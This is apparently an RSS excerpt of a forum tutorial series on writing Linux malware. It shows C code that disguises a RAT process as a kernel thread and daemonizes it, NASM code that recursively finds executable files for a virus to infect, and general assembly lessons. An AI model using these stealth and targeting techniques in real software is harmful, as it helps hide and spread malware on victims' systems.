#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  pid_t pid = fork();
  if (pid!=0) return 0;

  while (1) usleep (1000);
}
</code></pre>
<p>As you can see we just create a new copy of ourselves using <code>fork</code> and then we kill the parent (the one that received a PID different of 0). I have also removed the <code>getchar</code> because we are trying to get our process disconnected from the terminal and that is a function that uses <code>stdin</code>.</p>
<p>If we run this process, <code>ps</code> will show now this:</p>
<pre><code>$ ps -ax | grep bd2
  358 ?        S      0:27 [jbd2/sda5-8]
  991 ?        S      1:01 [jbd2/sda6-8]
26956 pts/24   S      0:00 [Jbd2/sda0-8]
</code></pre>
<p>Great… We have got rid of the <code>+</code>… But we still have an associated terminal to our process.</p>
<h1>
<a name="getting-rid-of-the-terminal-10" class="anchor" href="https://0x00sec.org#getting-rid-of-the-terminal-10"></a>Getting rid of the terminal</h1>
<p>The way to release the terminal associated to the process is to actually leave the current session. I’m not going to go into the details about session and process groups here. In simple words, you start a session when you log-in. Any process you create after that belongs to the session. This allows the system to know which process to kill when the session is closed by the user. Did you ever wonder how the OS magically know what to kill if you just leave your session?</p>
<p>Daemons, and also our cute RAT do not want to get killed when the user closes the session from which they were started… well, daemons are usually started by the system at start up, but just in case you start one of them manually in a terminal. The way to do this is to create a new session for our process. And we do this with the <code>setsid</code> system call:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main (int argc, char *argv[]) {
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  pid_t pid = fork();
  if (pid!=0) return 0;
  setsid ();
  while (1) usleep (1000);
}
</code></pre>
<p>Now we can compile and check again:</p>
<pre><code>$ ps -ax | grep bd2
  358 ?        S      0:27 [jbd2/sda5-8]
  991 ?        S      1:01 [jbd2/sda6-8]
27496 ?        Ss     0:00 [Jbd2/sda0-8]
</code></pre>
<p>Damn, what is that <code>s</code> that just popped up?</p>
<h1>
<a name="stop-being-a-process-leader-11" class="anchor" href="https://0x00sec.org#stop-being-a-process-leader-11"></a>Stop being a Process Leader</h1>
<p>If you read the man page for <code>setsid</code> it says:</p>
<blockquote>
<p>setsid()  creates  a new session if the calling process is not a process group leader.  The calling process is the leader of the new session (i.e., its session ID is made the same as its process ID).  The calling process also becomes the process group leader  of  a new process group in the session (i.e., its process group ID is made the same as its process ID).</p>
</blockquote>
<p>Also you can check the man page for <code>ps</code> to veryfy what does the <code>s</code> means in its output.</p>
<p>Done?.. There you go… That is what and where the <code>s</code> is/comes from. So, to stop being a session leader for this session, we have to… <code>fork</code> again.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int main (int argc, char *argv[]) {
  pid_t pid;
  printf ("This is RAT0X0 version 0.1\n");
  strcpy (argv[0],"[Jbd2/sda0-8]");
  if ((pid = fork()) != 0) return 0;
  setsid(); // Remove TTY
  if ((pid = fork()) != 0) return 0;

  while (1) usleep (1000);
}

</code></pre>
<pre><code>$ ps -ax | grep bd2
  358 ?        S      0:27 [jbd2/sda5-8]
  991 ?        S      1:01 [jbd2/sda6-8]
27742 ?        S      0:00 [Jbd2/sda0-8]
</code></pre>
<p>And there you go… Same fingerprint than the kernel processes… Well, the PID is way higher… Nobody is perfect.</p>
<blockquote>
<p>PIDs are reused when the maximal PID number is reached. This value is defined at <code>/proc/sys/kernel/pid_max</code> and usually is 32768… So you can start forking and exiting process until you get a pid below 1000/2000… Haven’t tried this but it should work… Just do not fork to fast or you will look like a fork bomb</p>
</blockquote>
<p>The code above is pretty simple and you should be able to code the assembler version by yourself. Just add the two new system calls in the <code>mfw.asm</code> file and do a couple comparisons and conditional jumps. If you do not want to do it yourself and you have any issue, be free to ask and , in any case, I will add the code in a later instalment anyway.</p>
<h1>
<a name="conclusion-12" class="anchor" href="https://0x00sec.org#conclusion-12"></a>Conclusion</h1>
<p>In this instalment we have gone quickly through the main features of a RAT and after that we have defined a simple one to use as example in the comming instalments. It has very few features so we can keep it simple while we learn more about our system. So far we have learn how to manipulate the way the process is shown for system tools like <code>ps</code> and <code>top</code>… and at the same time, accidentaly :), we have learn how to convert any program in a <code>daemon</code>. So far, <code>rat0x0</code> just looks like a regular system daemon… nothing really special about it. That is the key of a good RAT… just look normal.</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-xi-introduction-to-rats/26318">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-xi-introduction-to-rats/26318</link>
          <pubDate>Mon, 14 Jun 2021 19:40:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26318</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-xi-introduction-to-rats/26318.rss">Programming for Wanabes XI. Introduction to RATs</source>
        </item>
        <item>
          <title>Programming for Wanabes X. File details in asm</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>We have already wrote code to scan a single folder and in this instalment we are going to extend it to scan complete folder trees and also get the details from the files so our malware can decide which file is interesting or not.</p>
<p>This is going to be pretty short as we already know everything needed to implement this extension.</p>
<h1>
<a name="refresher-the-code-so-far-1" class="anchor" href="https://0x00sec.org#refresher-the-code-so-far-1"></a>Refresher… the code so far</h1>
<p>In the previous instalment, towards the end I mentioned that using an ascending loop will have some benefits in this specific case so, I will include this modification in the base code.</p>
<p>You can check it as an exercise. It does exactly the same than the previous version, but counts from zero to the number of bytes returned by <code>getdents</code>, instead of decreasing that value until we get to zero.</p>
<p>This is the code.</p>
<pre><code class="lang-auto">	global mfw_select_target
	extern mfw_puts
	extern mfw_putln
	extern mfw_openat
	extern mfw_newfstatat
	extern mfw_getdents
	extern mfw_close

	section .text
	
mfw_select_target:
	BUF_SIZE  EQU     0x400
	STAT_SIZE EQU     0x144
  	FD	      EQU     0x08
 	BUF       EQU     (FD   + BUF_SIZE)
	ST        EQU     (BUF + STAT_SIZE)
	STE       EQU     BUF
	D_NAME    EQU     0x12
	D_RECLEN  EQU     0x10
	ST_MODE   EQU     0x18
	
	;; Create Stack Frame
	push  rbp
	mov   rbp, rsp
	sub   rsp, STE
	
	;; Open Directory
	;; RDI and RSI should be all set
	mov  rdx, 0q200000 	;O_RDONLY | O_DIRECTORY
	call mfw_openat
	test al,al
	js   done1		; Exit if we cannot open the folder. Likely permission denied error
	
	mov  QWORD [rbp-FD], rax ;Store fd in local var
loop0:
	mov  rdi, QWORD [rbp-FD]
	lea  rsi, [rbp-BUF]
	mov  rdx, BUF_SIZE
	call mfw_getdents
	
	test ax,ax
	jz   done		    ; 0 means we are done reading the folder
	js   loop0 		    ; &lt;0 means error.... we just try again

	mov r9, rax		    ; Loop limit
	lea r8, [rbp-BUF] 	; Points to struct linux_dirent record
	xor r14,r14 		; Loop counter = 0

loop1:
	lea   rdi, [r8 + r14  + D_NAME] ; Offset to current dirent name

;; ***********************************************
;; All new code goes here
;; *****************************************************
	;;  For the time being just print file name
	mov  rdi, rsi
	call mfw_putln

next:
	movzx rdx, WORD [r8 + r14 + D_RECLEN] ; Get Record len | Same size thqan mov
	add r14,rdx
	cmp r14, r9
	jge loop0                ; If it is zero, get more data
	jmp loop1
	
done:	
	;; Close directory
	mov rdi, QWORD [rbp-FD]
	call mfw_close
done1:	
	leave     		; Set RSP=RBP and pops RBP
	ret

</code></pre>
<p>Before continuing, you may have noticed the use of <code>movzx</code> instruction. This is new and we haven’t talked about it before. This instruction and also it counterpart <code>movsx</code> allows us to read a value into a register that is smaller than the target register. Let’s check the instruction</p>
<pre><code class="lang-auto">	movzx rdx, WORD [r8 + r14 + D_RECLEN]
</code></pre>
<p>In this case we are moving a memory word (16 bits) into a 64 bits register. The <code>movZx</code> instruction will complete the target with zeros while the <code>movSx</code> will extend the sign. In this example, the value we want is 2 bytes, but we want to use it on the 64bits register for the arithmetic operations (actually the <code>edx</code> will likely be enough, but we would have to use the instruction in any case).</p>
<p>The difference between this instruction and a single move is that the last will not update the higher word on the register, and we should set the register to zero before copying only the lower 16bits.</p>
<p>In the same way, if we are dealing with negative numbers…</p>
<h1>
<a name="negative-numbers-2" class="anchor" href="https://0x00sec.org#negative-numbers-2"></a>Negative numbers</h1>
<p>So far we haven’t care much about negative numbers… in a sense, we kind of magically assumed that they just work as it happens on C or any other high level language, however, there is a few things we need to know about number representation and its associated arithmetic.</p>
<p>Let’s start thinking on a single byte (8 bits or 8 ones or zeros). As we know with 8 bits we can represent 256 values (from 0 to 255). That’s perfect for natural numbers, but what happens if we need negative numbers?.. And we need then, I can already told you that.</p>
<p>Well, in that case we need to encode the number differently. First thing is to store the sign of the number, and, that will take a bit… I mean, it cannot take less… at least not without over-complicating the solution. Then if 1 bit is reserved for the sign, we have 7 bits to represent the actual number and that is 128 values. let’s print a few of those numbers</p>
<pre><code>8 =&gt; 0 000 1000        -8 =&gt; 1 000 1000
7 =&gt; 0 000 0111        -7 =&gt; 1 000 0111
....
1 =&gt; 0 000 0001        -1 =&gt; 1 000 0001
0 =&gt; 0 000 0000         0 =&gt; 1 000 0000
</code></pre>
<p>So, we see a few problems with this representation. The first one is that we have two representations for the number zero. That is not convenient as can make computations ambiguous and we are also loosing the opportunity to represent one extra number.</p>
<p>The second problem of this representation is that multiplication is kind of easy, but addition is kind of a hell.</p>
<p>Fortunately for us, some smart people long ago come up with a better representation for the negative numbers…</p>
<h1>
<a name="twos-complement-3" class="anchor" href="https://0x00sec.org#twos-complement-3"></a>Two’s complement</h1>
<p>This representation of the numbers also uses the most significant bit to indicate the sign, but the value of the number is encoded in a smarter way. Let’s see our table of numbers again and then let’s explore the benefits of this representation:</p>
<pre><code>8 =&gt; 0 000 1000        -8 =&gt; 1 110 1000
7 =&gt; 0 000 0111        -7 =&gt; 1 111 1001
....
2 =&gt; 0 000 0010        -2 =&gt; 1 111 1110
1 =&gt; 0 000 0001        -1 =&gt; 1 111 1111
0 =&gt; 0 000 0000         
</code></pre>
<p>As we can see now there is one single representation for zero, that is actually zero (all bits zero). This has a consecuence… zero is somehow a positive number, because the most significant bit is 0 (that is our sign bit). This is why a signed char can take values from -128 to 127 (because the zero is part of the positives)</p>
<p>In addition to the sign, the rest of the number is constructed counting upward as usual for the positive numbers, and backwards for the negative ones…</p>
<p>Actually the way to change the sign of a number, or if you prefer, calculate  the two’s complement is as follows:</p>
<ul>
<li>Invert all bits in the number (this is the so called one’s complement)</li>
<li>Add 1</li>
</ul>
<p>Let’s use as example the number 5 and let’s calculate the two’s complement of it, or in other words, let’s determine the bit representation of -5.</p>
<pre><code>Number 5   -&gt;  00000101
NOT(5)     -&gt;  11111010
NOT(5) + 1 -&gt;  11111011
</code></pre>
<p>The other big advantage of this representation is that basic arithmetic operation will just work. Just add the 5 and -5 above and it will result in zero. Substraction and multiplication also works out of the box. I won’t go further into this topic. The interested reader shall read the <a href="https://en.wikipedia.org/wiki/Two%27s_complement#Converting_to_two's_complement_representation" rel="noopener nofollow ugc">Wikipedia page</a>, and if you are really into maths and scientific SW you also need to read <a href="https://www.itu.dk/~sestoft/bachelor/IEEE754_article.pdf" rel="noopener nofollow ugc">this</a>.</p>
<h1>
<a name="back-to-movsx-4" class="anchor" href="https://0x00sec.org#back-to-movsx-4"></a>Back to <code>movsx</code>
</h1>
<p>So, now that we know how a negative number is represented we can come back to the <code>movSx</code> where <code>S</code> stands for <em>sign</em>. This instruction works the same than <code>movzx</code> but performing what is know as sign extension.</p>
<p>Sign extension happens when copying some value of a specific datatype into another value but of a bigger datatype. Imagine you want to copy the value 7 in a byte in memory, into the 32 bits register <code>EDX</code>.</p>
<pre><code>EDX                                     Memory Byte
XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX     00000111
                                           |  (mov edx, BYTE [mem]
XXXXXXXX XXXXXXXX XXXXXXXX 00000111 &lt;------+
</code></pre>
<p>In the diagram above <code>X</code> means any value. It may be zero or one. When we move the byte into <code>EDX</code> we will just update the less significant byte… Anything else in the register will remind. However, when we use <code>movzx</code> we are forcing zeros in all the other bits in the register… and when using <code>movsz</code> we are forcing the sign bit. Let’s change the byte memory to some negative value</p>
<pre><code>EDX                                     Memory Byte
XXXXXXXX XXXXXXXX XXXXXXXX XXXXXXXX     11111110  (-2)
                                           |  (movzx edx, BYTE [mem]
00000000 00000000 00000000 11111110 &lt;------+
                                           |  (movsx edx, BYTE [mem]
11111111 11111111 11111111 11111110 &lt;------+
</code></pre>
<p>In the first case we copy the byte in the lower part of the register (actually <code>dl</code>) and then we set everything else to 0. En the second case we set everything else to the sign bit. This way, the result of the first case is 254 while in the second case it is still -2.</p>
<h1>
<a name="calling-statat-5" class="anchor" href="https://0x00sec.org#calling-statat-5"></a>Calling <code>statat</code>
</h1>
<p>Now we can just write the loop to call <code>statat</code> and check the file type. Let’s split this in two parts. First the call to <code>statat</code> and then the check of the file.</p>
<p>The first part is pretty straight forward:</p>
<pre><code class="lang-auto">
loop1:
	lea   rdi, [r8 + r14  + D_NAME] ; Offset to current dirent name
	
	;; Skip . and .. names
	;; ---------------------------
	cmp WORD [rdi], 0x002e  ; '.',0x00
	je next
	cmp WORD [rdi], 0x2e2e  ;  '..'
	jne check_file
	cmp BYTE [rdi+2], 0      
	je next
	
	;; Check file type and permissions
check_file:	
	lea    rsi, [rdi]	    ; Par2 : name
	mov    rdi, [RBP - FD]  ; Par1 : fd
	lea    rdx, [RBP - ST]  ; Par3 : struct stat
	xor    rcx, rcx		    ; Par4 : flags
	call   mfw_newfstatat
	
	test   al,al
	js     next		; Silently skip this file on error. Likely Permission denied
	
	;; ********************************
	;; Here the code to check the file
	;; *********************************
run_payload:
	;;  For the time being just print file name
	mov  rdi, rsi
	call mfw_putln

next:
	movzx rdx, WORD [r8 + r14 + D_RECLEN] ; Get Record len | Same size thqan mov
	(...)
</code></pre>
<p>The first part of the code just checks the file name and skips it in case it is <code>.</code> or ‘…’ in order to avoid infinite loops. The check is done comparing against the ascii values (<code>0x0023</code> and <code>0x002323</code>) of both strings. For the second case, I first tried to read a <code>DWORD</code> to just do a comparison, but it looks like the size of <code>..</code> is exactly three and I was getting some randon stuff in the most significant byte… any other way to do the check I thought about just ended in longer code… but let me know in the comments if you found a better way.</p>
<p>Then we just found the call to <code>newfstatat</code>. Nothing special here, we have already used this from C, we just set the second parameter first, because we already have that value in <code>rdi</code>, so we just do that assignment fist before overwriting <code>rdi</code> and we take advantage of <em>moving</em> data between registers.</p>
<p>Finally we check if the syscall failed and silently continue in that case.</p>
<h1>
<a name="checking-file-type-6" class="anchor" href="https://0x00sec.org#checking-file-type-6"></a>Checking file type</h1>
<p>Now we need to check the file type. As we did in C, we are going to look for executable files. Note that this is a basic check and in the real world you may need to do further checks. For instance, a virus will need to check that the file is also an <code>ELF</code> binary and not just a bash script… both are executable files but their structures are pretty different. Even when it is possible to infect a <code>bash</code> file that is something you do not really need special skills to do.</p>
<p>This part of the code also performs the recursive call that allows us to scan the whole filesystem tree.</p>
<pre><code class="lang-auto">	;; Check if it is a directory
	mov  eax, DWORD [rdx + ST_MODE]
	and  eax, 0q0170000
	cmp  eax, 0q0040000
	jz   scan_folder	; If it is a directory... scan recursively
	cmp  eax, 0q0100000 
	jnz  next           ; If it is not a regular file.... skip it
	
	;; If we got a regular file then let's check permissions
	mov  eax, DWORD [rdx + ST_MODE]
	and  eax, 0q00111	; Execution permisions
	jz   next		    ; If no execution permision set... skip the file
	jmp  run_payload	; Otherwise run the payload on it
	
scan_folder:
	;; Before the recursive call we need to store current state in the stack
	;; File descruptor and getents are already there. We just store the registers
	;; This way, we only use the memory when scanning a subfolder
	push  r8 		; Current getdents buffer
	push  r9		; Number of bytes in getents buffer
	push  r14       ; Current getendts buffer ofsset 

	call  mfw_select_target ; RDI and RSI already set to the right parameters
	;; Restore evertything and keep going
	pop   r14		; PUSH/POP are 2 bytes long... mov reg, [bp-XX] is 4
	pop   r9
	pop   r8
	jmp   next		; Continue
</code></pre>
<p>The first thing we do us to get the <code>st_mode</code> field from the <code>struct stat</code> returned by <code>newfstatat</code>. Then we mask the <code>__S_IFM</code> value that we have found when developing our C version and then we check if we are looking to a directory or a regular file. If the entry is a directory we jump to <code>scan_folder</code> to perform the recursive traversal of the just found subfolder, otherwise we check the permissions and if they don’t match we just discard this entry and do on to process the next one.</p>
<p>When we call ourselves recursively to traverse the subfolders we need to store in the stack the local variables we are holding on registers for efficiency. These are <code>r8</code> (the <code>getents</code> buffer we are processing), <code>r9</code> (the number of bytes in that buffer) and <code>r14</code> (the current offset in the buffer of the entry we are processing right now).</p>
<p>We could declare extra local variables in the stack as we did for the <code>FD</code>, but in this case we decided to just push and pop the values just before the <code>call</code>. This way, the code is shorter and we only perform that operation (saving to memory) only when it is necessary. Note that a <code>mov</code> is principle more efficient (faster) but it produces a bit longer code (4 bytes vs the 2 bytes required by the <code>push/pop</code>).</p>
<h1>
<a name="the-final-code-7" class="anchor" href="https://0x00sec.org#the-final-code-7"></a>The final code</h1>
<p>As usually, this is the final code of our <code>select_target</code> function:</p>
<pre><code class="lang-auto">	global mfw_select_target
	extern mfw_puts
	extern mfw_putln
	extern mfw_openat
	extern mfw_newfstatat
	extern mfw_getdents
	extern mfw_close

	section .text
	
mfw_select_target:
	BUF_SIZE  EQU     0x400
	STAT_SIZE EQU     0x144
  	FD	      EQU     0x08
 	BUF       EQU     (FD   + BUF_SIZE)
	ST        EQU     (BUF + STAT_SIZE)
	STE       EQU     BUF
	D_NAME    EQU     0x12
	D_RECLEN  EQU     0x10
	ST_MODE   EQU     0x18
	
	;; Create Stack Frame
	push  rbp
	mov   rbp, rsp
	sub   rsp, STE
	
	;; Open Directory
	;; RDI and RSI should be all set
	mov  rdx, 0q200000 	;O_RDONLY | O_DIRECTORY
	call mfw_openat
	test al,al
	js   done1		; Exit if we cannot open the folder. Likely permission denied error
	
	mov  QWORD [rbp-FD], rax ;Store fd in local var
loop0:
	mov  rdi, QWORD [rbp-FD]
	lea  rsi, [rbp-BUF]
	mov  rdx, BUF_SIZE
	call mfw_getdents
	
	test ax,ax
	jz   done		; 0 means we are done reading the folder
	js   loop0 		; &lt;0 means error.... we just try again

	mov r9, rax		    ; Loop limit
	lea r8, [rbp-BUF] 	; Points to struct linux_dirent record
	xor r14,r14 		; Loop counter = 0

loop1:
	lea   rdi, [r8 + r14  + D_NAME] ; Offset to current dirent name
	
	;; Skip . and .. names
	;; ---------------------------
	cmp WORD [rdi], 0x002e
	je next
	cmp WORD [rdi], 0x2e2e
	jne check_file
	cmp BYTE [rdi+2], 0
	je next
	
	;; Check file type and permissions
check_file:	
	lea    rsi, [rdi]	    ; Par2 : name
	mov    rdi, [RBP - FD]  ; Par1 : fd
	lea    rdx, [RBP - ST]  ; Par3 : struct stat
	xor    rcx, rcx		    ; Par4 : flags
	call   mfw_newfstatat
	
	test   al,al
	js     next		; Silently skip this file on error. Likely Permission denied
	
	;; Check if it is a directory
	mov  eax, DWORD [rdx + ST_MODE]
	and  eax, 0q0170000
	cmp  eax, 0q0040000
	jz   scan_folder	; If it is a directory... scan recursively
	cmp  eax, 0q0100000 
	jnz  next               ; If it is not a regular file.... skip it
	
	;; If we got a regular file then let's check permissions
	mov  eax, DWORD [rdx + ST_MODE]
	and  eax, 0q00111	; Execution permisions
	jz   next		    ; If no execution permision set... skip the file
	jmp  run_payload	; Otherwise run the payload on it
	
scan_folder:
	;; Before the recursive call we need to store current state in the stack
	;; File descriptor and getents are already there. We just store the registers
	;; This way, we only use the memory when scanning a subfolder
	push  r8 		; Current getdents buffer
	push  r9		; Number of bytes in getents buffer
	push  r14       ; Current getendts buffer ofsset 

	call  mfw_select_target ; RDI and RSI already set to the right parameters
	;; Restore evertything and keep going
	pop   r14		; PUSH/POP are 2 bytes long... mov reg, [bp-XX] is 4
	pop   r9
	pop   r8
	jmp   next		; Continue
	
run_payload:
	;;  For the time being just print file name
	mov  rdi, rsi
	call mfw_putln

next:
	movzx rdx, WORD [r8 + r14 + D_RECLEN] ; Get Record len | Same size thqan mov
	add r14,rdx
	cmp r14, r9
	jge loop0                ; If it is zero, get more data
	jmp loop1
	
done:	
	;; Close directory
	mov rdi, QWORD [rbp-FD]
	call mfw_close
done1:	
	leave     		; Set RSP=RBP and pops RBP
	ret

</code></pre>
<h1>
<a name="conclusions-8" class="anchor" href="https://0x00sec.org#conclusions-8"></a>Conclusions</h1>
<p>As I said this was very short, we already know a lot of assembler and system programming to code this part so this was just work we had to do. We took the chance to talk a little bit about number representation, and we got a recursive function working in assembly… which is not that hard once we learned what that involves in the previous instalments.</p>
<p>For the next instalment we should start looking into some payload… I envision a first theoretical instalment to introduce the related concepts before jumping in to the code…</p>
<p>So, now it is time for you to decide:</p>
<p><a href="https://0x00sec.org/t/programming-for-wanabes-x-file-details-in-asm/25843/1">Click to view the poll.</a></p>
<h2>
<a name="read-the-whole-series-here-9" class="anchor" href="https://0x00sec.org#read-the-whole-series-here-9"></a>Read the whole series here</h2>
<p><a href="https://0x00sec.org/t/programming-for-wanabes-ix-finding-files-in-asm/25794">Part IX. Finding Files in asm</a><br>
<a href="https://0x00sec.org/t/programming-for-wanabes-viii-file-details/25738">Part VIII, File Details</a><br>
<a href="https://0x00sec.org/t/programming-for-wanabes-vii-finding-files-i/25662">Part VII. Finding files</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-vi-malware-introduction/25595">Part VI. Malware Introduction</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090">Part V. A dropper</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-iv/22421">Part IV. The stack</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279">Part III. Your first Shell Code</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii-and-a-half/1196">Part II and a Half. Part II for ARM and MIPS</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii/1164">Part II. Shrinking your program</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-i/1143">Part I. Getting Started</a></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-x-file-details-in-asm/25843">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-x-file-details-in-asm/25843</link>
          <pubDate>Fri, 30 Apr 2021 19:53:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25843</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-x-file-details-in-asm/25843.rss">Programming for Wanabes X. File details in asm</source>
        </item>
        <item>
          <title>Programming for Wanabes IX. Finding Files in asm</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1><a name="heading-1" class="anchor" href="https://0x00sec.org#heading-1"></a></h1>
<p>Now, that the code to traverse directories is ready is time to get back to assembler and re-implement our code using this language. This will give as a chance to learn a lot of new assembly instructions and idioms.</p>
<p>To get started let’s write a base program that we can use to kick off this development. We will just show a message and exit. We had already done this in the past, so it should be quick an unpainful.</p>
<h1>
<a name="hello-world-again-2" class="anchor" href="https://0x00sec.org#hello-world-again-2"></a>Hello world again</h1>
<p>We will use the mini libc we implemented in the previous instalment, but for the assmebler part of the course I prefer to use NASM, so I have to slightly change the code we already have.</p>
<pre><code class="lang-auto">	global mfw_exit
	global mfw_write
	global mfw_close
	global mfw_openat
	global mfw_newfstatat
	global mfw_getdents
	global mfw_open
	global mfw_lstat
	global mfw_puts
	
	;; Syscalls
mfw_write:
	mov eax, 0x01
	syscall
	ret
	
mfw_openat:
	mov eax, 0x101
	syscall
	ret
	
mfw_close:
	mov eax, 0x03
	syscall
	ret

mfw_exit:
	mov eax, 0x3c
	syscall
	ret

mfw_newfstatat:
	mov r10, rcx
	mov eax, 0x106
	syscall
	ret

mfw_getdents:
	mov eax, 78
	syscall
	ret

mfw_open:
	mov eax, 0x02
	syscall
	ret

mfw_lstat:
	mov eax, 0x06
	syscall
	ret
</code></pre>
<p>Not that hard, AT&amp;T assembly uses the character <code>$</code> for literals and also the source and destination operands in the move are changed. You may have notice that we declared a global symbol <code>mfw_puts</code> but there is no label for it. We will implement it in a sec.</p>
<h1>
<a name="mfw_puts-3" class="anchor" href="https://0x00sec.org#mfw_puts-3"></a><code>mfw_puts</code>
</h1>
<p>You may remember this function from previous instalments. Its C implementation is:</p>
<pre><code class="lang-auto">int mfw_puts (char *s) {
  while (*s) mfw_write (1, s++, 1);
}
</code></pre>
<p>So it is time to do our first loop in assembler. As you will see in a second, assembler loops are way more simpler than in C… just jump around as needed.</p>
<pre><code class="lang-auto">;; rdi -&gt; string to print
mfw_puts:
	mov   rsi, rdi  ;; Put string on RSI as expected by write
	mov   rdi, 1
	mov   rdx, rdi
mfw_puts_l0:	
	cmp   BYTE [rsi], 0
	jz    mfw_puts_exit
	call  mfw_write   ;; write (RDI, RSI, RDX)
	inc   rsi
	jmp   mfw_puts_l0
mfw_puts_exit:
    xor rax,rax
	ret
</code></pre>
<p><em>NOTE:Add this code to the end of the minilibc,asm file, the one in previous section.</em></p>
<p>The function receives the string to print in <code>RDI</code>. Then we need to scan the string, if the value is <code>0</code> we are done and we return from the function. So, this is what the function does in detail:</p>
<ul>
<li>Copy <code>RDI</code>, the string we pass as parameter into <code>RSI</code>. The <code>write</code> syscall we will run to print the characters, expects the buffer to print in <code>RDI</code>.</li>
<li>Then we set <code>RDI</code> to 1 or stdout if you prefer. That is the first parameter to <code>write</code>
</li>
<li>And we set <code>RDX</code> to 1, because we are going to print the string character by character.</li>
<li>Then we check if the current content of <code>RDI</code> (the address pointed by <code>RSI</code> aka the string to print) is 0. We do this with the <code>CMP</code> instruction. The brackets around <code>RSI</code> indicates an indirect addressing, or in other words, we are interested on the content of the address pointed by <code>RSI</code> not the <code>RSI</code> value itself</li>
<li>The next instruction, <code>JZ</code> means that we will jump to the address indicated whenever the <code>Zero</code> flag is set. We will talk about flags in a sec, but for now. the <code>Zero</code> flag or <code>Z</code> is set whenever we run an arithmetic or logical operation, and the result is 0. The <code>cmp</code> is actually a difference between the two values passed as parameters. So, if it is zero, we finish the loop.</li>
<li>Otherwise, we call the <code>write</code> system call, and increase the <code>RSI</code> value. That means that we move to the next char in the string.</li>
</ul>
<p>This is a very simple code and I hope you have followed the explanation. We can write this code in many different ways. I will show you a couple so you get familiar with the use of the jumps and the comparisons.</p>
<pre><code class="lang-auto">mfw_puts1:
	mov   rsi, rdi
	mov   rdi, 1
	mov   rdx, rdi
	jmp   mfw_puts1_next
mfw_puts1_l0:	
	call  mfw_write
	inc   rsi
mfw_puts1_next	:
	cmp   BYTE [rsi], 0
	jnz    mfw_puts1_l0
mfw_puts1_exit:
	ret
</code></pre>
<p>This is exactly the same, but first jumping into the check and then looping. This is the code that <code>gcc</code> will usually generate.</p>
<p>Just for our understanding, let’s take a look to the code that <code>gcc</code> generated for our C version to see a couple of interesting details</p>
<pre><code class="lang-auto">000000000000066a &lt;mfw_puts&gt;:
                                
 66a:   55                      push   rbp
 66b:   48 89 e5                mov    rbp,rsp
 66e:   48 83 ec 10             sub    rsp,0x10                ;; Set stack frame and allocate local vars
 672:   48 89 7d f8             mov    QWORD PTR [rbp-0x8],rdi ;; Store string on local variable
 676:   eb 1e                   jmp    696 &lt;l0_next&gt;
l0:
 678:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8] ;; Retrieve pointer to string from stack
 67c:   48 8d 50 01             lea    rdx,[rax+0x1]           ;; Increase pointer
 680:   48 89 55 f8             mov    QWORD PTR [rbp-0x8],rdx ;; Store increased pointer for next iteration
 684:   ba 01 00 00 00          mov    edx,0x1                 ;; Just call write
 689:   48 89 c6                mov    rsi,rax
 68c:   bf 01 00 00 00          mov    edi,0x1
 691:   e8 47 03 00 00          call   mfw_write
l0_next: 
 696:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8] ;; Retrieve pointer to next character
 69a:   0f b6 00                movzx  eax,BYTE PTR [rax]
 69d:   84 c0                   test   al,al                   ;; And check for 0
 69f:   75 d7                   jne    678 &lt;l0&gt;
 6a1:   90                      nop
 6a2:   c9                      leave
 6a3:   c3                      ret

</code></pre>
<p>Some comments on the gcc code:</p>
<ul>
<li>First, it uses the second kind of loop we described (jump into the comparison first).</li>
<li>Second, it systematically stores things in the stack. The string pointer is treated as a local variable</li>
<li>Third it uses <code>lea</code> to increase the pointer… We will discuss this later</li>
<li>Forth it uses <code>test</code> instead of <code>cmp</code>… We will also discuss this in a second.</li>
</ul>
<p>The code above was the default gcc code. It is 58 bytes long. Let’s see what we get when we compile for size optimisation:</p>
<pre><code class="lang-auto">                                
 6aa:   80 3f 00                cmp    BYTE PTR [rdi],0x0     ;; Check if current char is 0
 6ad:   48 89 fe                mov    rsi,rdi                ;; Store string pointer in `RSI`
 6b0:   75 01                   jne    6b3 &lt;mfw_puts+0x9&gt;     ;; If character != 0 continue
 6b2:   c3                      ret
 6b3:   53                      push   rbx  ;; Preserve RBX. We will use it for temporal data
l0:
 6b4:   48 8d 5e 01             lea    rbx,[rsi+0x1]           ;; Increase pointer using RBX
 6b8:   ba 01 00 00 00          mov    edx,0x1                 ;; Set parameters to call syscall
